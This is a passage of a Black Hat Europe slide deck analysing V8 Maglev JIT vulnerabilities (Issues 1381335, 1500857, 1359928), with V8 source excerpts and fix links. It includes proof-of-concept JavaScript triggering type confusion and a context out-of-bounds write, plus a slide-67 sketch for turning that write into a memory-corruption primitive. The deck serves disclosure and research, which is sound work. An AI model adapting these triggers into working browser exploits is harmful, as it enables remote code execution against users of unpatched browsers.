#### Issue 1381335

const obj3 = {a:42}; const obj4 = {a:42}; const obj5 = {a:42}; const obj6 = {a:42}; obj5.c = "test"; obj3.a = 13.37; function foo(arg1,arg2) { const obj11 = arg1.e; const obj12 = {a:42}; function inlined_func1() { arg1.e = 13.37; arg2.g = obj2; } function inlined_func2() { return obj12; } const obj24 = [13.37]; const obj26 = [13.37]; const obj27 = [BigInt,512,obj24,obj24,BigInt,"test",13.37,BigInt,obj26,13.37]; for (let i = 0; i < 100; i++) { const obj31 = inlined_func2(arg1,obj12); } arg2.d = 42; } const obj32 = {a:42}; for (let i = 0; i < 100; i++) { foo(obj4,obj32); **_Optimize foo using input “obj4”_** } for (let j = 0; j < 2; j++) { foo(1,obj6); **_Found the input “1” rather than “obj4”,_** } **_Bail out to Ignition._** const obj43 = foo(obj5,obj32);

#BHEU @BlackHatEvents

## Slide 55

#### Issue 1381335

**_What type of nodes may cause deoptimization in Maglev?_**

class CheckMapsWithMigration

- : public FixedInputNodeT<1, CheckMapsWithMigration> {

- using Base = FixedInputNodeT<1, CheckMapsWithMigration>;

class ReduceInterruptBudget : public FixedInputNodeT<0, ReduceInterruptBudget> { using Base = FixedInputNodeT<0, ReduceInterruptBudget>;

public:

explicit CheckMapsWithMigration(uint64_t bitfield, const ZoneHandleSet<Map>& maps, CheckType check_type)

: Base(bitfield), maps_(maps), check_type_(check_type) {}

public:

explicit ReduceInterruptBudget(uint64_t bitfield, int amount) : Base(bitfield), amount_(amount) { DCHECK_GT(amount, 0);

}

- static constexpr OpProperties kProperties = **OpProperties::EagerDeopt()** | OpProperties::DeferredCall();

static constexpr OpProperties kProperties = OpProperties::DeferredCall() | **OpProperties::LazyDeopt()** ;

const ZoneHandleSet<Map>& maps() const { return maps_; }

int amount() const { return amount_; }

static constexpr int kReceiverIndex = 0; Input& receiver_input() { return input(kReceiverIndex); }

void AllocateVreg(MaglevVregAllocationState*); void GenerateCode(MaglevAssembler*, const ProcessingState&); void PrintParams(std::ostream&, MaglevGraphLabeller*) const;

};

void AllocateVreg(MaglevVregAllocationState*); void GenerateCode(MaglevAssembler*, const ProcessingState&); void PrintParams(std::ostream&, MaglevGraphLabeller*) const;

- private:

- const int amount_;

};

#BHEU @BlackHatEvents

## Slide 56

void CheckMapsWithMigration::GenerateCode(MaglevAssembler* masm,

#### Issue 1381335

###### **_How to recovery the context when deoptimization_**

_1. Save all register according to_ **_node>register_snapshot_** _before a outer call_

_2. Call_ **_Runtime Function_** _for checking_

_3. Check Runtime status to determine whether to deoptimize_

_4. Recovery Ignition Context according to_ **_FrameState_**

_5. Continue executing with Bytecode in Ignition_

const ProcessingState& state) { // [...] if (map->is_migration_target()) { __ JumpToDeferredIf( not_equal, [](MaglevAssembler* masm, ZoneLabelRef continue_label, ZoneLabelRef done, Register object, int map_index, CheckMapsWithMigration* node) { // [...] Register return_val = Register::no_reg(); { **SaveRegisterStateForCall save_register_state( masm, node->register_snapshot()); [1]** __ Push(object); __ Move(kContextRegister, masm>native_context().object()); **__ CallRuntime(Runtime::kTryMigrateInstance); [2]** save_register_state.DefineSafepoint(); return_val = kReturnRegister0; if (node>register_snapshot().live_registers.has(return_val)) { DCHECK(!node->register_snapshot().live_registers.has( kScratchRegister)); __ movq(kScratchRegister, return_val); return_val = kScratchRegister; } } **__ cmpl(return_val, Immediate(0)); [3]** __ j(equal, *continue_label); // [4][5] #BHEU @BlackHatEvents

}

## Slide 57

#### Issue 1381335

class SaveRegisterStateForCall { public:

SaveRegisterStateForCall(MaglevAssembler* masm, RegisterSnapshot snapshot)

: masm(masm), snapshot_(snapshot) { masm->PushAll(snapshot_.live_registers); masm->PushAll(snapshot_.live_double_registers, kDoubleSize);

- }

template <typename RegisterT> void

StraightForwardRegisterAllocator::DropRegisterValueAtEnd(RegisterT reg) {

RegisterFrameState<RegisterT>& list = GetRegisterFrameState<RegisterT>(); list.unblock(reg); if (!list.free().has(reg)) { ValueNode* node = list.GetValue(reg);

- // If the register is not live after the current node, just

- remove its

// value.

**if (node->live_range().end == current_node_->id()) {**

node->RemoveRegister(reg); } else {

> DropRegisterValue(list, reg); **Saving the live regs** } **analyzed by maglev** list.AddToFree(reg); } }

const **compiler::BytecodeLivenessState** * GetInLiveness() const { return GetInLivenessFor(iterator_.current_offset()); }

void MaglevGraphBuilder::MergeIntoInlinedReturnFrameState( BasicBlock* predecessor) {

int target = inline_exit_offset();

if (merge_states_[target] == nullptr) {

- // All returns should have the same liveness, which is that only the // accumulator is live.

const compiler::BytecodeLivenessState* liveness = GetInLiveness(); DCHECK(liveness->AccumulatorIsLive()); DCHECK_EQ(liveness->live_value_count(), 1);

- // If there's no target frame state, allocate a new one. merge_states_[target] = MergePointInterpreterFrameState::New(

*compilation_unit_, current_interpreter_frame_, target,
NumPredecessors(target), predecessor, liveness);
}
Using the FrameState
// […]
analyzed by
}
bytecode-analysis
register_snapshot vs  FrameState #BHEU @BlackHatEvents
Mismatch??

## Slide 58

#### Issue 1381335

###### **_r8 : the map needs to be checked_**

- **_->  No longer used after CheckMapsWithMigration (Not in live regs)_**

- **_->  Needed when bail out to Ignition_**

#BHEU @BlackHatEvents

## Slide 59

#### Issue 1381335

**Side effect !!!** Change rdx while **_r8 : the map needs to be checked_** the call

- **_->  No longer used after CheckMapsWithMigration (Not in live regs)_**

- **_->  Needed when bail out to Ignition_**

#BHEU @BlackHatEvents

## Slide 60

#### Issue 1381335

Type
Confusion
r8 : the map needs to be checked
->  No longer used after CheckMapsWithMigration (Not in live regs)
->  Needed when bail out to Ignition

fix: https://chromium.googlesource.com/v8/v8/+/8ceffab2b8fc94a78b2253bcfa419d5c5b37f864

#BHEU @BlackHatEvents

## Slide 61

#### Issue 1381335

###### **_The pattern:_**

_1. An IR which has an_ **_EagerDeopt_** _property_

_2. When generating code, it has a_ **_outer call_** _._

_3. Before the call, it saves register using_ **_node->snapshot_** _rather than_ **_eager_info_** _._

_4. If there is node lifetime differ, it may lead to a type confusion._

#BHEU @BlackHatEvents

## Slide 62

#### Issue 1500857: Potential type confusion issue similar to Issue 1381335

- class CheckedObjectToIndex

- : public FixedInputValueNodeT<1, CheckedObjectToIndex> {

- using Base = FixedInputValueNodeT<1, CheckedObjectToIndex>;

- public: explicit CheckedObjectToIndex(uint64_t bitfield) : Base(bitfield) {}

- [1] static constexpr OpProperties kProperties = **OpProperties::EagerDeopt()** | OpProperties::Int32() | OpProperties::DeferredCall() | OpProperties::ConversionNode();

- };

- DCHECK(!snapshot.live_tagged_registers.has(result_reg)); {

   - **SaveRegisterStateForCall save_register_state(masm, snapshot);** AllowExternalCallThatCantCauseGC scope(masm);

   - __ PrepareCallCFunction(1);

   - __ Move(arg_reg_1, object);

   - **__ CallCFunction( ExternalReference::string_to_array_index_function(), 1);**

   - // No need for safepoint since this is a fast C call.

   - __ Move(result_reg, kReturnRegister0);

- }

#BHEU @BlackHatEvents

## Slide 63

#### Issue 1500857: Potential type confusion issue similar to Issue 1381335

fix: https://chromium.googlesource.com/v8/v8/+/92d4e663fa8afc74876a39cab46476118a0c9c74

#BHEU @BlackHatEvents

## Slide 64

#### An Interesting RCE trip in Maglev

###### **_The beginning_**

function v1(v2) { let v3 = undefined; try { const v5 = eval(v2); } catch(v6) { v3 = v6; } const v8 = v3 instanceof SyntaxError; const v9 = !v8; } while (1 == 1) { v1("{ { { var x; } } let x; }"); }

#BHEU @BlackHatEvents

## Slide 65

0x272a00214096 Context A @  0 : 84 00 08 CreateFunctionContext [0], [8]
0x272a00214099 @  3 : 1a f9  PushContext r1
......
0x272a002140b3 @  29 : 28 01 00 01 LdaLookupGlobalSlot [1], [0],
[1]
0x272a002140b7 @  33 : 25 06 StaCurrentContextSlot [6]
0x272a002140b9 @  35 : 19 ff f8  Mov <context>, r2
function v1(v2) {
0x272a002140bc Context B @  38 : 82 02 CreateBlockContext [2]
let v3 = undefined;
0x272a002140be @  40 : 1a f7  PushContext r3
try {
const v5 = eval(v2); ......
0x272a002140e0 @  74 : 66 47 00 f4 06 CallRuntime
} catch(v6) {
[ResolvePossiblyDirectEval], r6-r11
v3 = v6;
} ......
0x272a002140ec @  86 : 1b f7  PopContext r3
const v8 = v3 instanceof SyntaxError;
0x272a002140ee @  88 : 8b 15 Jump [21] (0x272a00214103 @
const v9 = !v8;
109)
}
0x272a002140f0 @  90 : c1  Star4
0x272a002140f1 Context C @  91 : 83 f6 04 CreateCatchContext r4, [4]
while (1 == 1) {
0x272a002140f4 @  94 : c3  Star2
v1("{ { { var x; } } let x; }");
0x272a002140f5 @  95 : 10 LdaTheHole
}
0x272a002140f6 @  96 : a7  SetPendingMessage
Confuse
0x272a002140f7 @  97 : 0b f8  Ldar r2
Between
0x272a002140f9 @  99 : 1a f6  PushContext r4
0x272a002140fb @  101 : 17 02 LdaImmutableCurrentContextSlot Different
[2] Context
0x272a002140fd @  103 : 24 f6 06 00 StaContextSlot r4, [6], [0]
0x272a00214101 Context C @  107 : 1b f6  PopContext r4
0x272a0021410f @  121 : 17 07 LdaImmutableCurrentContextSlot
[7]
Crash
0x272a00214111 @  123 : 55 ToBooleanLogicalNot
#BHEU @BlackHatEvents
0x272a00214112 OOB Write!! @  124 : 25 08 StaCurrentContextSlot [8]

## Slide 66

###### **_What is the Context ?_**

function v1(v2) { let **v3** = undefined; **_ContextLength(v1) = 3_** try { const v5 = eval(v2); } catch(v6) { **_ContextLength(CatchContext) = 1_** v3 = v6; } const **v8** = v3 instanceof SyntaxError; const **v9** = !v8; **_OOB Write via CatchContext_** } while (1 == 1) { v1("{ { { var x; } } let x; }"); }

void MaglevGraphBuilder::VisitStaCurrentContextSlot() { ValueNode* context = GetContext(); int slot_index = iterator_.GetIndexOperand(0); AddNewNode<StoreTaggedFieldWithWriteBarrier>( {context, GetAccumulatorTagged()}, **Context::OffsetOfElementAt(slot_index));** } int ScopeInfo::ContextLength() const { if (IsEmpty()) return 0; int context_locals = ContextLocalCount(); bool function_name_context_slot = HasContextAllocatedFunctionName(); bool force_context = ForceContextAllocationBit::decode(Flags()); bool has_context = context_locals > 0 || force_context || function_name_context_slot || scope_type() == WITH_SCOPE || scope_type() == CLASS_SCOPE || (scope_type() == BLOCK_SCOPE && SloppyEvalCanExtendVars() && is_declaration_scope()) || (scope_type() == FUNCTION_SCOPE && SloppyEvalCanExtendVars()) || (scope_type() == FUNCTION_SCOPE && IsAsmModule()) || scope_type() == MODULE_SCOPE; if (!has_context) return 0; return ContextHeaderLength() + **context_locals** + (function_name_context_slot ? 1 : 0); }

#BHEU @BlackHatEvents

## Slide 67

###### **_How to make the OOB more controllable?_**

_1. Use the resizable_ **_context_** _well._

_2. Allocate the victim Array nearby the_ **_context_** _._

_3. Store the_ **_context_local_var_** _into global var._

_4. OOB write to set the victim with a large length._

_5. Make more powerful primitive._

holder = []; function v1(v2) { let v3 = undefined; let v31 = undefined; let v32 = undefined; let v33 = undefined; let v34 = undefined; let v35 = undefined; let v36 = undefined; let v37 = undefined; **_1_** try { let pad = []; let v4 = new Array(10); **_2_** v4[0]=1.1; holder.push(v4); **_3_** const v5 = eval(v2); } catch(v6) { v3 = v6; } const v8 = 0xf0000; **_4_** } for(var i = 0 ; i<0x180;i++){ v1("p4nda.SEGV_ACCERR = new"); } res =v1("p4nda.SEGV_ACCERR = new"); vularr = holder[holder.length-1]; **_5_**

#BHEU @BlackHatEvents

## Slide 68

#### An Interesting RCE trip in Maglev

#BHEU @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
EUROPE @O25
An Interesting RCE trip in Maglev
tan
DRG
tromium:
Revision: fb
and Line:
ble Path:
file Path:
triations:
13494451
3042ad4b
382867ad
3fdal7df
9-3fdal7df
3fd33f16-
3 f65b38-
2ba47366.
248c3fbd
58155072
2979853
25ad6029
ab5e9272
0352ca2
62cb9bab.
911e33b9.
36d5ee52:
376d29ba
-3fdal7dt
-3fdal7dt
-3fdal7dt
-3fdal7dt
-3fdal7dt
5124949
-9c6dd96d
-41986bdd
-3fdal7df
-3fdal7dt
-3fdal7dt
python -m
4 @ ndaliu 1 in /tmp/rce [2:49:12]
python -m SimpleHTTPServer 9999
Serving HTTP on 0.0.0.0 port 9999 ..
127.0.0.1 - - [23/Sep/2022 02:49:40] "GET /exp.
html HTTP/1.1"
200
```

## Slide 69

#### An Interesting RCE trip in Maglev

**_The Patch: Issue 1359928_**

fix: https://chromium.googlesource.com/v8/v8/+/33e90400d095ffdcf0c75fab56fd61ebfbb7d4e6

#BHEU @BlackHatEvents

## Slide 70

# _Conclusion & Takeaways_

#BHEU @BlackHatEvents

## Slide 71

#### Conclusion & Takeaways

- **Takeaways**

   - summarize the design principles and features of Maglev

   - Analyze unique and common attack surfaces in Maglev

   - Explore the bug hunting method for Maglev

- **Effectiveness**

   - Dozens of different crash samples

   - **7** High-risk vulnerabilities

   - Top 20 of Chrome VRP Researchers in 2023

- **Conclusion**

#BHEU @BlackHatEvents

## Slide 72

#### Acknowledgement

- **_Yang Yu (@tombkeeper)_**

- **_Moon Liang (@MoonL1ang)_**

- **_Samuel Groß and V8 Team_**

- **_Amy Ressler and Chrome VRP_**

#BHEU @BlackHatEvents

## Slide 73

# _Thanks_

Bohan Liu (@P4nda20371774) Zheng Wang (@xmzyshypnc1)

#BHEU @BlackHatEvents
